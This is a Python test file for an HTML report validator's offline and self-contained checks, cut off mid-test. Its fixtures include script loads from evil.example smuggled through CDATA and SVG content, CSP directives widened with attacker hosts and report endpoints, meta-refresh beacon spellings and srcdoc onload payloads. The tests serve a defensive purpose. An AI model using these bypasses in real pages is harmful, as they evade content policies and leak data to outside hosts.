from _validate_helpers import *
from checks import resources  # noqa: E402

import difflib  # noqa: E402  the cut-boundary oracle in the head-fallback parity check
import shutil  # noqa: E402  the node-gated cross-engine parity check needs `which`

from html import escape as html_escape  # noqa: E402  builds the nested-frame depth fixtures

from checks import layer  # noqa: E402  the srcdoc walk's own depth budget, read by its test
from checks import resources  # noqa: E402  the gate's own offline predicates, tested directly


class NewCheckTests(unittest.TestCase):
    """Coverage for the self-contained-guarantee, embedded-comment schema, duplicate-heading,
    canvas-report-all, and --strict additions."""

    def _body(self, main, *extra):
        return [HANDLED_REGION, EMBEDDED_REGION, comment_ui(), main] + list(extra) + [JS_REGION]

    def _errs_warns(self, content):
        return _validate_text(content)

    # -- self-contained guarantee -------------------------------------------------- #
    def test_external_img_src_errors(self):
        main = MAIN.replace("<p>content</p>", '<p>content</p>\n  <img src="https://example.com/x.png" alt="x">')
        errors, _ = self._errs_warns(build(body=self._body(main)))
        self.assertTrue(any("loads over the network" in e for e in errors), errors)

    def test_local_path_img_warns_not_errors(self):
        main = MAIN.replace("<p>content</p>", '<p>content</p>\n  <img src="images/x.png" alt="x">')
        errors, warnings = self._errs_warns(build(body=self._body(main)))
        self.assertEqual(errors, [], errors)
        self.assertTrue(any("local path" in w for w in warnings), warnings)

    def test_data_uri_img_is_clean(self):
        main = MAIN.replace("<p>content</p>", '<p>content</p>\n  <img src="data:image/png;base64,AAAA" alt="x">')
        errors, warnings = self._errs_warns(build(body=self._body(main)))
        self.assertEqual(errors, [], errors)
        self.assertEqual(warnings, [], warnings)

    def test_external_script_src_errors(self):
        errors, _ = self._errs_warns(build(body=self._body(MAIN, '<script src="https://evil.cdn/x.js"></script>')))
        self.assertTrue(any("self-contained guarantee" in e for e in errors), errors)

    def test_a_script_hidden_behind_a_bogus_cdata_comment_still_errors(self):
        # CMH-VAL-21: in HTML content `<![CDATA[` is a bogus comment ending at the first `>`,
        # so this <script> is LIVE and fetches remote code. The tag lookup this check reads used
        # to be a bare HTMLParser, which swallowed the whole marked section and reported no
        # script at all, so the document passed the self-contained guarantee.
        smuggled = '<![CDATA[><script src="//evil.example/x.js"></script>]]>'
        errors, _ = self._errs_warns(build(body=self._body(MAIN, smuggled)))
        self.assertTrue(any("self-contained guarantee" in e and "evil.example" in e
                            for e in errors), errors)

    def test_a_resource_hidden_inside_a_foreign_script_or_style_still_errors(self):
        # CMH-VAL-21: NOTHING is raw text inside foreign content. HTML5 takes a `<script>` /
        # `<style>` start tag in the SVG namespace through "any other start tag", which inserts a
        # foreign element and leaves the tokenizer in the DATA state - so this `<img>` is a real
        # element a browser builds (`img` breaks out of foreign content and is inserted in the
        # HTML namespace) and FETCHES, as Chromium confirms. Reading the body as raw text left it
        # out of both lookups this check reads, so the document passed the self-contained
        # guarantee while still making a network request.
        for elem in ("script", "style"):
            with self.subTest(elem=elem):
                smuggled = ('<svg><%s><img src="//evil.example/x.png"></%s></svg>'
                            % (elem, elem))
                errors, _ = self._errs_warns(build(body=self._body(MAIN, smuggled)))
                self.assertTrue(any("evil.example" in e for e in errors), errors)

    def test_chartjs_cdn_script_is_exempt_from_self_contained_error(self):
        script = '<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>'
        errors, _ = self._errs_warns(build(body=self._body(MAIN, script)))
        self.assertFalse(any("self-contained guarantee" in e for e in errors), errors)

    def test_offline_mode_rejects_chartjs_cdn_script(self):
        script = '<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>'
        doc = with_offline_mode(build(body=self._body(MAIN, script)))
        errors, _ = self._errs_warns(doc)
        self.assertTrue(any("offline mode" in e and "Chart.js" in e for e in errors), errors)

    def test_offline_mode_rejects_network_resources_and_css_imports(self):
        css = CSS_REGION.replace(
            ":root { --cp-bg: #ffffff; --cp-text: #000000; }",
            '@import "https://cdn.example.com/theme.css";\n'
            ":root { --cp-bg: #ffffff; --cp-text: #000000; }")
        main = MAIN.replace(
            "<p>content</p>",
            '<img src="https://example.com/x.png" alt="x">\n'
            '<iframe src="https://example.com/f.html"></iframe>\n'
            '<video poster="https://example.com/poster.png"><track src="https://example.com/c.vtt"></video>')
        extras = [
            '<link rel="stylesheet" href="https://example.com/app.css">',
            '<script src="https://example.com/app.js"></script>',
        ]
        doc = with_offline_mode(build(css=css, body=self._body(main, *extras)))
        errors, _ = self._errs_warns(doc)
        for needle in ("<img", "<iframe", "<video", "<track", "<link", "<script", "@import"):
            self.assertTrue(any("offline mode" in e and needle in e for e in errors),
                            "expected offline error for %s, got %r" % (needle, errors))

    def test_offline_mode_rejects_a_speculative_connection_hint_whatever_its_href(self):
        # CMH-OFFLINE-04 (#1076): `preconnect` and `dns-prefetch` exist only to make the browser
        # reach out early and show a reader NOTHING, so an offline document may not carry one at
        # all - not even in a scheme the network-URL predicate reads as local, and not with a
        # relative or same-document href. The export strip removes exactly these tokens
        # unconditionally, so a narrower rule here would bless a hint the strip deletes (or reject
        # a file the exporter just produced), which is the drift these two sides exist to prevent.
        hrefs = [
            "ftp://hint.example", "x-cmh-probe://hint.example", "https://hint.example",
            "//hint.example", "local-hint.html", "#top", "",
        ]
        for href in hrefs:
            for rel in ("preconnect", "dns-prefetch", "DNS-Prefetch", "alternate preconnect"):
                with self.subTest(href=href, rel=rel):
                    attrs = ' href="%s"' % href if href else ""
                    link = '<link rel="%s"%s>' % (rel, attrs)
                    doc = with_offline_mode(build(body=self._body(MAIN, link)))
                    errors, _ = self._errs_warns(doc)
                    self.assertTrue(
                        any("offline mode" in e and "reach out to a host" in e for e in errors),
                        "expected an offline rejection for %s, got %r" % (link, errors))

    def test_offline_mode_keeps_a_link_whose_rel_is_not_a_hint(self):
        # The control that makes the rule above safe: an unconditional strip is only free of
        # content loss because it is scoped to the two relations that carry no content. Every
        # other link - relative href and all - is author content and must still validate clean,
        # and so must a rel that merely LOOKS like a hint to a sloppy match (a browser tokenizes a
        # rel list on ASCII whitespace only, so an NBSP-joined value is ONE opaque token).
        for link in ('<link rel="canonical" href="#top">',
                     '<link rel="alternate" href="local-alternate.html">',
                     '<link rel="author" href="mailto:someone@example.com">',
                     '<link rel="preconnects" href="local.html">',
                     '<link rel="pre-connect" href="local.html">',
                     '<link rel="dnsprefetch" href="local.html">',
                     '<link rel="preconnect\u00a0x" href="local.html">',
                     '<link rel="dns-prefetch\ufeff" href="local.html">'):
            with self.subTest(link=link):
                doc = with_offline_mode(build(body=self._body(MAIN, link)))
                errors, _ = self._errs_warns(doc)
                self.assertEqual(errors, [], "%s must validate clean, got %r" % (link, errors))

    def test_offline_mode_reports_a_mixed_hint_and_network_loader_link_twice(self):
        # A `rel` that mixes a hint with a LOADING relation is two defects, and the gate must name
        # both: the strip drops only the hint TOKEN there, so the element survives as a network
        # stylesheet and is stripped by the loader pass - reporting only the hint would hand the
        # author one error per run and hide the second.
        link = '<link rel="preconnect stylesheet" href="https://cdn.example/app.css">'
        doc = with_offline_mode(build(body=self._body(MAIN, link)))
        errors, _ = self._errs_warns(doc)
        self.assertTrue(any("reach out to a host" in e for e in errors), errors)
        self.assertTrue(any("loads over the network" in e for e in errors),
                        "the network stylesheet half of a mixed rel must be reported too: %r" % errors)

    def test_offline_mode_reports_only_the_hint_when_nothing_else_fetches(self):
        # ...and the other side of that rule: `alternate` is not a fetching relation, so the
        # element the strip leaves behind (`rel="alternate"` with a network href) is a reference a
        # browser does not follow on its own. Reporting a second, network error here would be a
        # false rejection of a file the exporter legitimately produces.
        link = '<link rel="alternate preconnect" href="https://alt.example/page.html">'
        doc = with_offline_mode(build(body=self._body(MAIN, link)))
        errors, _ = self._errs_warns(doc)
        self.assertTrue(any("reach out to a host" in e for e in errors), errors)
        self.assertFalse(any("loads over the network" in e for e in errors),
                         "a non-fetching relation with a network href is not a load: %r" % errors)

    def test_offline_mode_accepts_inlined_data_resources(self):
        main = MAIN.replace(
            "<p>content</p>",
            '<img src="data:image/png;base64,AAAA" alt="x">\n'
            '<video poster="data:image/png;base64,AAAA"></video>')
        doc = with_offline_mode(build(body=self._body(main)))
        errors, warnings = self._errs_warns(doc)
        self.assertEqual(errors, [], errors)
        self.assertEqual(warnings, [], warnings)

    def test_offline_mode_requires_restrictive_csp(self):
        errors, _ = self._errs_warns(with_offline_mode(build(), csp=False))
        self.assertTrue(any("Content-Security-Policy" in e for e in errors), errors)
        weak = with_offline_mode(build()).replace("form-action 'none'; ", "", 1)
        errors, _ = self._errs_warns(weak)
        self.assertTrue(any("form-action 'none'" in e for e in errors), errors)

    def test_offline_mode_rejects_a_widened_fetch_directive(self):
        # Exclusivity used to be enforced only for the directives whose required token is `'none'`,
        # so a hand-authored policy could add a HOST SOURCE to the four FETCH directives and still
        # pass --strict. That is the premise the CSS and attribute network-literal gates lean on
        # (CMH-VAL-08 criterion 3: "the offline CSP closes those fetch channels"), so while it went
        # unenforced a permissive policy plus a slashless reference was arbitrary remote code in a
        # file certified as offline-clean.
        for directive, required in (("script-src", "'unsafe-inline'"),
                                    ("style-src", "'unsafe-inline'"),
                                    ("img-src", "data:"),
                                    ("font-src", "data:")):
            pair = "%s %s" % (directive, required)
            doc = with_offline_mode(build()).replace(
                pair, pair + " https://evil.example", 1)
            errors, _ = self._errs_warns(doc)
            self.assertTrue(any(directive in e and "evil.example" in e for e in errors),
                            "%s: %r" % (directive, errors))

    def test_offline_mode_rejects_a_fetch_source_that_grants_a_network_load(self):
        # None of these is a host source, and each still reaches the network: `'self'` on a
        # `file://` document is unspecified (an opaque origin) and has historically meant the
        # containing directory, a HASH source matches an EXTERNAL script carrying `integrity` in
        # CSP3, and `'strict-dynamic'` (with the nonce that usually accompanies it) grants whatever
        # an already-trusted script loads. A scheme or wildcard source is a network source outright.
        for token in ("'self'", "'strict-dynamic'", "'sha256-YWJj'", "'nonce-YWJj'", "https:", "*"):
            doc = with_offline_mode(build()).replace(
                "script-src 'unsafe-inline'", "script-src 'unsafe-inline' %s" % token, 1)
            errors, _ = self._errs_warns(doc)
            self.assertTrue(any("script-src" in e and token in e for e in errors),
                            "%s: %r" % (token, errors))

    def test_offline_mode_accepts_a_policy_whose_extra_sources_cannot_fetch(self):
        # The rule is an ALLOWLIST of source expressions that provably cannot fetch, not an exact
        # match on the exporter's own string, so a legitimate hand-authored policy is not rejected
        # for no reason. Source expressions are ASCII case-insensitive, which `DATA:` pins.
        doc = with_offline_mode(build())
        doc = doc.replace("script-src 'unsafe-inline'",
                          "script-src 'unsafe-inline' 'unsafe-eval' 'wasm-unsafe-eval'", 1)
        doc = doc.replace("style-src 'unsafe-inline'",
                          "style-src 'unsafe-inline' 'unsafe-hashes' 'report-sample'", 1)
        doc = doc.replace("img-src data:", "img-src DATA: blob:", 1)
        doc = doc.replace("font-src data:", "font-src data: blob:", 1)
        errors, warnings = self._errs_warns(doc)
        self.assertEqual(errors, [], errors)
        self.assertEqual(warnings, [], warnings)

    def test_a_csp_meta_a_browser_never_applies_does_not_satisfy_the_offline_policy(self):
        # A `<template>`'s contents live in an inert DocumentFragment, and the HTML pragma
        # directives are processed only for a meta the head holds - so neither placement is ever
        # the document's policy, and reading either suppressed the missing-CSP error outright.
        parked = ('<template><meta http-equiv="Content-Security-Policy" content="%s"></template>\n'
                  % OFFLINE_CSP)
        doc = with_offline_mode(build(body=self._body(MAIN)), csp=False)
        errors, _ = self._errs_warns(doc.replace("<head>\n", "<head>\n" + parked, 1))
        self.assertTrue(any("missing Content-Security-Policy" in e for e in errors), errors)
        in_body = '<meta http-equiv="Content-Security-Policy" content="%s">' % OFFLINE_CSP
        errors, _ = self._errs_warns(
            with_offline_mode(build(body=self._body(MAIN, in_body)), csp=False))
        self.assertTrue(any("missing Content-Security-Policy" in e for e in errors), errors)

    def test_a_repeated_csp_directive_is_read_the_way_a_browser_reads_it(self):
        # A browser IGNORES every occurrence of a directive after the first, so the FIRST copy is
        # the policy. Reading the LAST one (a plain dict build) let a permissive first copy be
        # masked by a strict repeat written after it.
        doc = with_offline_mode(build()).replace(
            "script-src 'unsafe-inline'",
            "script-src 'unsafe-inline' https://evil.example; script-src 'unsafe-inline'", 1)
        errors, _ = self._errs_warns(doc)
        self.assertTrue(any("script-src" in e and "evil.example" in e for e in errors), errors)

    def test_offline_mode_rejects_a_directive_the_offline_contract_does_not_require(self):
        # The required set is not the whole policy. CSP3's more-specific fetch directives OVERRIDE
        # the ones this contract pins when they are present (`script-src-elem` beats `script-src`
        # for a <script src> load, `style-src-elem` beats `style-src`), and `worker-src` /
        # `media-src` / `manifest-src` are safe today only because they are ABSENT and fall back to
        # `default-src 'none'`. A reporting endpoint is worse still: it is live network egress out
        # of a document that promises none, carrying whatever the violation report names.
        for extra in ("script-src-elem https://evil.example",
                      "style-src-elem https://evil.example",
                      "worker-src https://evil.example",
                      "child-src https://evil.example",
                      "prefetch-src https://evil.example",
                      "media-src https://evil.example",
                      "manifest-src https://evil.example",
                      "report-uri https://evil.example/collect",
                      "report-to https://evil.example/collect"):
            name = extra.split()[0]
            doc = with_offline_mode(build()).replace(
                "script-src 'unsafe-inline'", "script-src 'unsafe-inline'; " + extra, 1)
            errors, _ = self._errs_warns(doc)
            self.assertTrue(any(name in e for e in errors), "%s: %r" % (name, errors))

    def test_offline_mode_accepts_an_extra_directive_that_can_only_tighten(self):
        # The rule is "an extra directive may only tighten", not "no extra directive": a source
        # list of exactly 'none', or none at all, cannot widen anything, and the directives that
        # carry no source list at all (a sink group, a policy name, a sandbox flag) are named
        # rather than run through a source-list test their grammar does not have.
        doc = with_offline_mode(build()).replace(
            "script-src 'unsafe-inline'",
            "script-src 'unsafe-inline'; worker-src 'none'; upgrade-insecure-requests; "
            "require-trusted-types-for 'script'; trusted-types cmh", 1)
        errors, warnings = self._errs_warns(doc)
        self.assertEqual(errors, [], errors)
        self.assertEqual(warnings, [], warnings)

    def test_offline_mode_accepts_an_empty_source_list_where_none_is_required(self):
        # A directive with NO sources matches nothing, so it is exactly as strict as `'none'`.
        # Reporting it as missing its required token would reject a browser-equivalent policy.
        doc = with_offline_mode(build()).replace("connect-src 'none'", "connect-src", 1)
        errors, warnings = self._errs_warns(doc)
        self.assertEqual(errors, [], errors)
        self.assertEqual(warnings, [], warnings)

    def test_a_head_end_tag_that_opens_the_body_moves_the_csp_meta_out_of_the_head(self):
        # "in head" and "after head" both treat an end tag named body, html or br as "anything
        # else": the head is popped and a <body> is inserted, so the policy <meta> written after
        # one is a BODY child whose pragma never runs. Tracking the boundary on start tags and
        # character data alone recorded it as the document's policy.
        for closer in ("</body>", "</html>", "</br>"):
            doc = with_offline_mode(build()).replace("<head>\n", "<head>\n" + closer + "\n", 1)
            errors, _ = self._errs_warns(doc)
            self.assertTrue(any("missing Content-Security-Policy" in e for e in errors),
                            "%s: %r" % (closer, errors))
        # The control, and the reason the list must not be widened: every OTHER end tag in those
        # two modes is ignored, so a policy written after one is still a head child.
        doc = with_offline_mode(build()).replace("<head>\n", "<head>\n</div>\n", 1)
        errors, _ = self._errs_warns(doc)
        self.assertEqual(errors, [], errors)

    def test_offline_mode_accepts_a_csp_meta_a_non_fetching_element_precedes(self):
        # Lateness is decided by CAPABILITY, not by tag name: a `rel=canonical` link loads nothing
        # and a `type=application/json` block neither runs nor loads, so a policy written after one
        # still covers the whole document. Rejecting it would be a false rejection carrying a
        # message that claims something the element cannot do.
        doc = with_offline_mode(build()).replace(
            "<head>\n",
            '<head>\n<link rel="canonical" href="#top">\n'
            '<script type="application/json" id="cmhDemoData">{"a":1}</script>\n', 1)
        errors, warnings = self._errs_warns(doc)
        self.assertEqual(errors, [], errors)
        self.assertEqual(warnings, [], warnings)

    def test_offline_mode_reads_the_policy_the_way_csp_tokenizes_it(self):
        # CSP splits a policy on ASCII whitespace only, so a NON-ASCII space between a directive
        # name and its value leaves a browser with one unrecognized directive name and NO policy at
        # all. Python's `str.split()` is Unicode-aware and read it as a well-formed directive, so
        # the whole policy could be neutralized with one character per directive while the gate
        # reported it complete.
        doc = with_offline_mode(build()).replace(
            "default-src 'none'", "default-src\u00a0'none'", 1)
        errors, _ = self._errs_warns(doc)
        self.assertTrue(any("default-src" in e for e in errors), errors)

    def test_offline_mode_reads_a_late_csp_predecessor_link_through_the_shared_rel_set(self):
        # The CSP-lateness rule asks the SAME "does this <link> fetch?" question the offline
        # resource gate and the export strip ask, through the shared `FETCHING_LINK_RELS` /
        # `link_rel_tokens` pair - so it has to move with them. A relation only one of the three
        # readers knows (`apple-touch-icon-precomposed` was exactly that) would leave a policy
        # written after a real fetch certified as covering the whole document; and a separator HTML
        # does NOT tokenize on (U+001C, which Python's argument-less `str.split()` does) would make
        # this reader see a relation a browser never does and reject a policy that is fine.
        fetching = with_offline_mode(build()).replace(
            "<head>\n", '<head>\n<link rel="apple-touch-icon-precomposed" href="icon.png">\n', 1)
        errors, _ = self._errs_warns(fetching)
        self.assertTrue(any("Content-Security-Policy" in e for e in errors), errors)
        inert = with_offline_mode(build()).replace(
            "<head>\n", '<head>\n<link rel="stylesheet\u001cx" href="local.css">\n', 1)
        errors, warnings = self._errs_warns(inert)
        self.assertEqual(errors, [], errors)
        self.assertEqual(warnings, [], warnings)

    def test_offline_mode_rejects_a_csp_meta_a_fetching_element_already_preceded(self):
        # A meta-delivered policy is NOT retroactive: it governs only what the parser reaches after
        # it. A fetch or an execution written above it happens with no policy in force, which is
        # exactly the channel the slashless attribute spellings ride.
        doc = with_offline_mode(build()).replace(
            "<head>\n", "<head>\n<script>void 0;</script>\n", 1)
        errors, _ = self._errs_warns(doc)
        self.assertTrue(any("Content-Security-Policy" in e for e in errors), errors)

    def test_offline_mode_accepts_a_csp_meta_only_inert_elements_precede(self):
        # The control for the rule above: a charset meta, a title and a base cannot fetch or
        # execute, so a policy written after them still covers the whole document.
        doc = with_offline_mode(build()).replace(
            "<head>\n", '<head>\n<meta charset="utf-8">\n<title>t</title>\n<base href="./">\n', 1)
        errors, warnings = self._errs_warns(doc)
        self.assertEqual(errors, [], errors)
        self.assertEqual(warnings, [], warnings)

    def test_non_whitespace_head_text_moves_the_csp_meta_out_of_the_head(self):
        # A non-whitespace character token in "in head" pops the head and opens the body, so the
        # <meta> written after it is a child of BODY - and the HTML pragma directives return early
        # for a meta that is not a head child. Tracking the head on start tags alone recorded it.
        doc = with_offline_mode(build()).replace("<head>\n", "<head>\nZZZ\n", 1)
        errors, _ = self._errs_warns(doc)
        self.assertTrue(any("missing Content-Security-Policy" in e for e in errors), errors)

    def test_a_csp_meta_written_after_the_head_is_still_the_documents_policy(self):
        # The other direction, and the reason `</head>` must NOT end this view: the "after head"
        # insertion mode re-pushes the head element for a base/link/meta/script/style/title/template
        # start tag, so this meta really is a head child and a browser really does apply it.
        # Dropping it would report a document that HAS a policy as having none. Here it is reported
        # only for being LATE (this fixture's own <link>, <script> and <style> precede it), which is
        # itself the proof it was read as the document's policy rather than discarded.
        meta = '<meta http-equiv="Content-Security-Policy" content="%s">\n' % OFFLINE_CSP
        doc = with_offline_mode(build(), csp=False).replace("</head>\n", "</head>\n" + meta, 1)
        errors, _ = self._errs_warns(doc)
        self.assertFalse(any("missing Content-Security-Policy" in e for e in errors), errors)
        self.assertTrue(any("not retroactive" in e for e in errors), errors)

    def test_any_applied_csp_policy_that_meets_the_contract_clears_the_check(self):
        # CSP enforcement across several policies is CONJUNCTIVE - a resource must be allowed by
        # every one - so a compliant policy beside a permissive one still bounds the document.
        weak = '<meta http-equiv="Content-Security-Policy" content="default-src \'none\'">\n'
        doc = with_offline_mode(build()).replace("<head>\n", "<head>\n" + weak, 1)
        errors, _ = self._errs_warns(doc)
        self.assertEqual(errors, [], errors)
        # ...and when NO applied policy meets it, the FIRST one's shortfalls are what is reported.
        doc = with_offline_mode(build(), csp=False).replace("<head>\n", "<head>\n" + weak, 1)
        errors, _ = self._errs_warns(doc)
        self.assertTrue(any("must include script-src 'unsafe-inline'" in e for e in errors), errors)

    def test_offline_mode_rejects_network_form_actions(self):
        main = MAIN.replace(
            "<p>content</p>",
            '<form action="https://example.com/post"><button formaction="//example.com/button">Send</button>'
            '<input formaction="https://example.com/input" value="Send"></form>')
        errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(main))))
        for needle in ("<form action", "<button formaction", "<input formaction"):
            self.assertTrue(any("offline mode" in e and needle in e for e in errors),
                            "expected offline form error for %s, got %r" % (needle, errors))

    def test_offline_mode_rejects_network_meta_refresh(self):
        doc = with_offline_mode(build(body=self._body(MAIN, '<meta http-equiv="refresh" content="0; url=https://example.com/out">')))
        errors, _ = self._errs_warns(doc)
        self.assertTrue(any("offline mode" in e and "meta refresh" in e for e in errors), errors)
        # The BEACON wording specifically, not just any refresh rejection: every refresh is now an
        # error, so without this the network branch could collapse into the generic message and the
        # target parser CMH-VAL-08 keeps would stop being exercised in the positive direction.
        self.assertTrue(any("points at a network URL" in e for e in errors), errors)

    def test_offline_mode_rejects_a_meta_refresh_that_omits_the_url_keyword(self):
        # The `url=` keyword is OPTIONAL in the HTML shared declarative refresh steps: once the
        # time and its `;`/`,`/whitespace separator are consumed, anything that is not `url` is
        # taken as the URL itself. So dropping four characters was a cheaper bypass than the
        # scheme-only spelling this gate was widened for.
        for content in ("0;https://evil.example",
                        "0;https:evil.example",
                        "0,https://evil.example",
                        "0 https://evil.example",
                        "0;'https:evil.example'",
                        "0;url= https:evil.example",
                        "0;url=' https://evil.example'",
                        "0.5;https://evil.example"):
            doc = with_offline_mode(build(body=self._body(
                MAIN, '<meta http-equiv="refresh" content="%s">' % content)))
            errors, _ = self._errs_warns(doc)
            # The BEACON wording, not merely "some refresh error": since every refresh is rejected,
            # a generic-message assertion would pass even if the target parser stopped extracting
            # the URL at all, which is exactly what this test exists to pin.
            self.assertTrue(any("points at a network URL" in e for e in errors),
                            "expected an offline meta refresh beacon for %r, got %r" % (content, errors))

    def test_offline_mode_rejects_a_meta_refresh_with_a_remote_file_authority(self):
        # A special scheme's relative-slash state treats `\` like `/`, so on a `file://` document
        # `\\host` resolves to `file://host/...` - a UNC fetch off the machine, and a top-level
        # navigation the CSP cannot stop either. The explicit `file:` spelling of the same host
        # has to count for the same reason.
        for content in ("0;url=\\\\evil.example/out",
                        "0;url=/\\evil.example/out",
                        "0;url=file://evil.example/share/x.html",
                        "0;url=file:\\\\evil.example\\share\\x.html",
                        "0;file://evil.example/share/x.html"):
            doc = with_offline_mode(build(body=self._body(
                MAIN, '<meta http-equiv="refresh" content="%s">' % content)))
            errors, _ = self._errs_warns(doc)
            self.assertTrue(any("points at a network URL" in e for e in errors),
                            "expected an offline meta refresh beacon for %r, got %r" % (content, errors))

    def test_offline_mode_rejects_a_scheme_only_meta_refresh(self):
        # A browser resolves `https:evil.example` against a file:// document exactly as it
        # resolves `https://evil.example`, and a meta refresh is a TOP-LEVEL NAVIGATION, which no
        # meta-delivered CSP can restrict - so while the gate required the slashes, the whole
        # channel was open to a one-token spelling change.
        for content in ("0;url=https:evil.example",
                        "0; url='http:evil.example/out'",
                        "0;URL=HTTPS:evil.example"):
            doc = with_offline_mode(build(body=self._body(
                MAIN, '<meta http-equiv="refresh" content="%s">' % content)))
            errors, _ = self._errs_warns(doc)
            self.assertTrue(any("points at a network URL" in e for e in errors),
                            "expected an offline meta refresh beacon for %r, got %r" % (content, errors))

    def test_offline_mode_reads_a_meta_refresh_target_with_the_shared_network_predicate(self):
        # Every refresh is rejected, so what is left to get wrong is WHICH message the rejection
        # carries - and the bespoke pattern that decided it drifted from the shared
        # `is_network_url` every other egress gate reads, in BOTH directions. The
        # four-or-more-separator `file:` spelling is an EMPTY-host file URL whose UNC-shaped path a
        # real Chromium on Windows was measured resolving off the machine - the platform, not the
        # URL parser, opens that authority - so the attribute gate counts it and the bespoke arms,
        # which read exactly two separators, called it local. In the other direction a Windows DRIVE
        # LETTER is turned into a path by the file-host state, so `file://C:/x.html` reaches no host
        # at all and must not be named a beacon.
        for content in ("0;url=file:////evil.example/x.html",
                        "0;url=file://///evil.example/x.html"):
            with self.subTest(content=content):
                doc = with_offline_mode(build(body=self._body(
                    MAIN, '<meta http-equiv="refresh" content="%s">' % content)))
                errors, _ = self._errs_warns(doc)
                self.assertTrue(any("points at a network URL" in e for e in errors),
                                "expected the beacon wording for %r, got %r" % (content, errors))
        # A slash run of THREE or more is where the shared predicate deliberately over-reports, and
        # inheriting that is the point of the change rather than an accident of it. What such a
        # reference resolves to depends on the BASE: from a document served over http/https (the
        # marketplace site publishes these reports that way) the special-authority states ignore the
        # run and `///host` is that host, while from a `file:` base the file-host state takes an
        # empty host and it is a local path. The `/{2,}` arm counts both, the fail-CLOSED reading a
        # gate whose miss is a beacon should make - and the cost here is only wording, since the
        # refresh is rejected either way. The backslash spellings normalize into the same run.
        for content in ("0;url=///evil.example/out", "0;url=\\//evil.example/out"):
            with self.subTest(content=content):
                doc = with_offline_mode(build(body=self._body(
                    MAIN, '<meta http-equiv="refresh" content="%s">' % content)))
                errors, _ = self._errs_warns(doc)
                self.assertTrue(any("points at a network URL" in e for e in errors),
                                "expected the beacon wording for %r, got %r" % (content, errors))
        for content in ("0;url=file://C:/x.html", "0;url=file://c|/x.html"):
            with self.subTest(content=content):
                doc = with_offline_mode(build(body=self._body(
                    MAIN, '<meta http-equiv="refresh" content="%s">' % content)))
                errors, _ = self._errs_warns(doc)
                self.assertFalse(any("points at a network URL" in e for e in errors),
                                 "unexpected beacon wording for %r: %r" % (content, errors))
                self.assertTrue(any("whatever its target" in e for e in errors),
                                "expected the generic wording for %r: %r" % (content, errors))

    def test_offline_mode_rejects_a_local_meta_refresh_too(self):
        # The exporter removes EVERY `meta[http-equiv=refresh]` whatever its target, so a file
        # carrying a relative one is a file an export would change - and a refresh is a TOP-LEVEL
        # NAVIGATION no meta-delivered CSP can restrict, which an injected `<base href>` rebases
        # onto the network. The gate errored only on a network target, so both sides disagreed.
        for content in ("5;url=./x.html", "0;url=#a", "30", "0;url=data:text/html,x"):
            with self.subTest(content=content):
                doc = with_offline_mode(build(body=self._body(
                    MAIN, '<meta http-equiv="refresh" content="%s">' % content)))
                errors, _ = self._errs_warns(doc)
                # The GENERIC branch by its own wording, so an inverted branch selection (or a
                # collapse of the two messages into one) cannot leave this green.
                self.assertTrue(any("whatever its target" in e for e in errors), (content, errors))

    def test_offline_mode_names_a_network_meta_refresh_target_only_when_there_is_one(self):
        # Every refresh is rejected (above), but the two messages must stay distinguishable: only
        # a target a browser resolves to a network host earns the beacon wording. These are the
        # false-positive controls for the target parser: each is a value a browser either resolves
        # INSIDE the file or does not treat as a refresh at all. `url=https:...` with no time is
        # not a refresh (the algorithm returns when the time is empty), the quoted value is
        # TRUNCATED at its closing quote so the `url=https:` inside it is ordinary path text, and
        # the keyword's `=` may be preceded only by ASCII whitespace - an NBSP makes the whole
        # tail a relative reference.
        for content in ("5;url=./x.html",
                        "0;url=#a",
                        "0;url=sub/page.html",
                        "30",
                        "url=https:evil.example",
                        "0;url='./x;url=https:evil.example'",
                        "0;url\u00a0=https:evil.example",
                        "0;url=data:text/html,x",
                        "0;url=./x.html?url=https://evil.example",
                        "0;url=foo.html;url=https:evil.example",
                        "0;remark url=https:evil.example",
                        "0;url=https:",
                        "0;url=http:",
                        "0;url=https://",
                        "0;url=\\x.html",
                        "0;urhttps://evil.example",
                        "0;urlhttps://evil.example",
                        "0;u'https://evil.example'",
                        "0;url https://evil.example",
                        "0;url=https: ",
                        "0;url=file:///C:/x.html",
                        "0;url=file://localhost/x.html",
                        "0;url=file:notes.html",
                        "0;url=http\u017f://evil.example"):
            doc = with_offline_mode(build(body=self._body(
                MAIN, '<meta http-equiv="refresh" content="%s">' % content)))
            errors, _ = self._errs_warns(doc)
            self.assertFalse(any("points at a network URL" in e for e in errors),
                             "unexpected network meta refresh error for %r: %r" % (content, errors))
            self.assertTrue(any("meta refresh" in e for e in errors),
                            "expected the generic meta refresh error for %r: %r" % (content, errors))

    def test_offline_mode_rejects_an_iframe_srcdoc(self):
        # A `srcdoc` carries a whole nested DOCUMENT as an attribute VALUE, so neither side of the
        # offline contract could see inside it: the strip cleared only `src` and its element walk
        # never descends into a string, and this gate's tokenizer reads the nested markup as
        # attribute text rather than tags. An inline handler, a meta refresh, or a network loader
        # therefore rode through an export AND past `--strict`. The direction both sides now take
        # is that an offline document may not carry one at all.
        for markup in ('<iframe srcdoc="&lt;img src=//evil.example/x.png&gt;"></iframe>',
                       '<iframe srcdoc="&lt;body onload=location=String.fromCharCode(47)&gt;"></iframe>',
                       '<iframe srcdoc=""></iframe>',
                       '<iframe srcdoc></iframe>'):
            with self.subTest(markup=markup):
                doc = with_offline_mode(build(body=self._body(MAIN, markup)))
                errors, _ = self._errs_warns(doc)
                self.assertTrue(any("offline mode" in e and "srcdoc" in e for e in errors),
                                "expected an offline srcdoc error for %r, got %r" % (markup, errors))

    def test_offline_mode_rejects_an_iframe_srcdoc_wherever_it_is_parked(self):
        # The same shapes every other offline rule is held to: `<template>` content the export
        # walks into, a `<noscript>` fallback the reader who cannot run the layer really parses,
        # and a self-closed foreign element the exporter's DOM walk reaches.
        for markup in ('<template><iframe srcdoc="&lt;p&gt;x&lt;/p&gt;"></iframe></template>',
                       '<noscript><iframe srcdoc="&lt;p&gt;x&lt;/p&gt;"></iframe></noscript>',
                       '<svg><iframe srcdoc="&lt;p&gt;x&lt;/p&gt;"/></svg>'):
            with self.subTest(markup=markup):
                doc = with_offline_mode(build(body=self._body(MAIN, markup)))
                errors, _ = self._errs_warns(doc)
                self.assertTrue(any("offline mode" in e and "srcdoc" in e for e in errors),
                                "expected an offline srcdoc error for %r, got %r" % (markup, errors))

    def test_offline_mode_accepts_an_iframe_without_a_srcdoc(self):
        # The control: the rule is about the nested document, not about the element. A legitimate
